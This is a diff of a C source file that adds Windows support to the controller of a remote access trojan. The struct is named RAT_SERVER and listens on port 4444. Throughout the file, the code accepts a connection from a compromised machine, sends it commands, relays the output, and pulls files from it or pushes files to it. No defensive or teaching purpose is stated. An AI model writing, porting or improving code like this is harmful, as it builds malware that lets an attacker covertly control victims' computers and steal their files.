@@ -4,14 +4,28 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <sys/wait.h>
-#include <sys/stat.h>
 #include <signal.h>
-#include <sys/time.h>
+
+#ifdef _WIN32
+    #include <winsock2.h>
+    #include <ws2tcpip.h>
+    #include <windows.h>
+    #include <io.h>
+    #define close closesocket
+    #define sleep(x) Sleep((x)*1000)
+    #pragma comment(lib, "ws2_32.lib")
+    typedef int socklen_t;
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <netinet/in.h>
+    #include <arpa/inet.h>
+    #include <sys/wait.h>
+    #include <sys/time.h>
+    #define INVALID_SOCKET -1
+#endif
+
+#include <sys/stat.h>
 
 #define PORT 4444
 #define BUFFER_SIZE 4096
@@ -20,8 +34,13 @@
 typedef struct {
     char host[16];
     int port;
+#ifdef _WIN32
+    SOCKET server_fd;
+    SOCKET client_fd;
+#else
     int server_fd;
     int client_fd;
+#endif
     struct sockaddr_in address;
     struct sockaddr_in client_addr;
 } RAT_SERVER;
@@ -48,18 +67,36 @@ void print_banner() {
 }
 
 int setup_server(RAT_SERVER *server) {
+#ifdef _WIN32
+    WSADATA wsaData;
+    int wsaResult = WSAStartup(MAKEWORD(2,2), &wsaData);
+    if (wsaResult != 0) {
+        printf("WSAStartup failed: %d\n", wsaResult);
+        return -1;
+    }
+#endif
+
     int opt = 1;
     
     // Create socket
-    if ((server->server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
+    if ((server->server_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
+#ifdef _WIN32
+        printf("Socket creation failed: %d\n", WSAGetLastError());
+        WSACleanup();
+#else
         perror("Socket creation failed");
+#endif
         return -1;
     }
     
     // Set socket options
     if (setsockopt(server->server_fd, SOL_SOCKET, SO_REUSEADDR, 
-                   &opt, sizeof(opt))) {
+                   (char*)&opt, sizeof(opt))) {
+#ifdef _WIN32
+        printf("Setsockopt failed: %d\n", WSAGetLastError());
+#else
         perror("Setsockopt failed");
+#endif
         return -1;
     }
     
@@ -70,13 +107,21 @@ int setup_server(RAT_SERVER *server) {
     // Bind socket
     if (bind(server->server_fd, (struct sockaddr *)&server->address, 
              sizeof(server->address)) < 0) {
+#ifdef _WIN32
+        printf("Bind failed: %d\n", WSAGetLastError());
+#else
         perror("Bind failed");
+#endif
         return -1;
     }
     
     // Listen for connections
     if (listen(server->server_fd, 5) < 0) {
+#ifdef _WIN32
+        printf("Listen failed: %d\n", WSAGetLastError());
+#else
         perror("Listen failed");
+#endif
         return -1;
     }
     
@@ -92,8 +137,12 @@ int accept_client(RAT_SERVER *server) {
     
     if ((server->client_fd = accept(server->server_fd, 
                                    (struct sockaddr *)&server->client_addr, 
-                                   &client_len)) < 0) {
+                                   &client_len)) == INVALID_SOCKET) {
+#ifdef _WIN32
+        printf("Accept failed: %d\n", WSAGetLastError());
+#else
         perror("Accept failed");
+#endif
         return -1;
     }
     
@@ -124,10 +173,15 @@ void receive_response(RAT_SERVER *server) {
     int max_response_size = sizeof(full_response) - 1;
     
     // Set socket to non-blocking temporarily to handle timeouts
+#ifdef _WIN32
+    DWORD timeout = 1000; // 1 second timeout in milliseconds
+    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+#else
     struct timeval timeout;
     timeout.tv_sec = 1;  // 1 second timeout
     timeout.tv_usec = 0;
     setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+#endif
     
     while (total_received < max_response_size) {
         memset(buffer, 0, BUFFER_SIZE);
@@ -162,9 +216,14 @@ void receive_response(RAT_SERVER *server) {
     }
     
     // Reset socket to blocking mode
+#ifdef _WIN32
+    timeout = 0;
+    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+#else
     timeout.tv_sec = 0;
     timeout.tv_usec = 0;
     setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+#endif
     
     if (total_received > 0) {
         printf("%s", full_response);
@@ -184,26 +243,50 @@ void handle_download(RAT_SERVER *server, const char *remote_filename, const char
         struct stat st;
         if (stat(local_destination, &st) == 0 && S_ISDIR(st.st_mode)) {
             // Destination is a directory, append filename
+#ifdef _WIN32
+            const char *base_filename = strrchr(remote_filename, '\\');
+            if (!base_filename) {
+                base_filename = strrchr(remote_filename, '/');
+            }
+#else
             const char *base_filename = strrchr(remote_filename, '/');
+#endif
             if (base_filename) {
-                base_filename++; // Skip the '/'
+                base_filename++; // Skip the separator
             } else {
                 base_filename = remote_filename;
             }
+#ifdef _WIN32
+            snprintf(filepath, sizeof(filepath), "%s\\%s", local_destination, base_filename);
+#else
             snprintf(filepath, sizeof(filepath), "%s/%s", local_destination, base_filename);
+#endif
         } else {
             // Destination is a full file path
             strcpy(filepath, local_destination);
         }
     } else {
         // No destination specified, use current directory with base filename
+#ifdef _WIN32
+        const char *base_filename = strrchr(remote_filename, '\\');
+        if (!base_filename) {
+            base_filename = strrchr(remote_filename, '/');
+        }
+#else
         const char *base_filename = strrchr(remote_filename, '/');
+#endif
         if (base_filename) {
-            base_filename++; // Skip the '/'
+            base_filename++; // Skip the separator
         } else {
             base_filename = remote_filename;
         }
-        snprintf(filepath, sizeof(filepath), "./%s", base_filename);
+        snprintf(filepath, sizeof(filepath), ".%c%s", 
+#ifdef _WIN32
+            '\\',
+#else
+            '/',
+#endif
+            base_filename);
     }
     
     file = fopen(filepath, "wb");
@@ -252,9 +335,16 @@ void handle_upload(RAT_SERVER *server, const char *filename, const char *destina
         snprintf(upload_info, sizeof(upload_info), "%s|%s\n", destination, filename);
     } else {
         // Extract just the filename for default location
+#ifdef _WIN32
+        const char *base_filename = strrchr(filename, '\\');
+        if (!base_filename) {
+            base_filename = strrchr(filename, '/');
+        }
+#else
         const char *base_filename = strrchr(filename, '/');
+#endif
         if (base_filename) {
-            base_filename++; // Skip the '/'
+            base_filename++; // Skip the separator
         } else {
             base_filename = filename;
         }
@@ -373,6 +463,9 @@ void cleanup(RAT_SERVER *server) {
     if (server->server_fd > 0) {
         close(server->server_fd);
     }
+#ifdef _WIN32
+    WSACleanup();
+#endif
 }
 
 void signal_handler(int sig) {
@@ -384,14 +477,21 @@ int main() {
     RAT_SERVER server;
     
     // Setup signal handlers
+#ifndef _WIN32
     signal(SIGINT, signal_handler);
     signal(SIGTERM, signal_handler);
+#endif
     
     // Initialize server
     strcpy(server.host, "127.0.0.1");
     server.port = PORT;
+#ifdef _WIN32
+    server.client_fd = INVALID_SOCKET;
+    server.server_fd = INVALID_SOCKET;
+#else
     server.client_fd = -1;
     server.server_fd = -1;
+#endif
     
     if (setup_server(&server) < 0) {
         cleanup(&server);
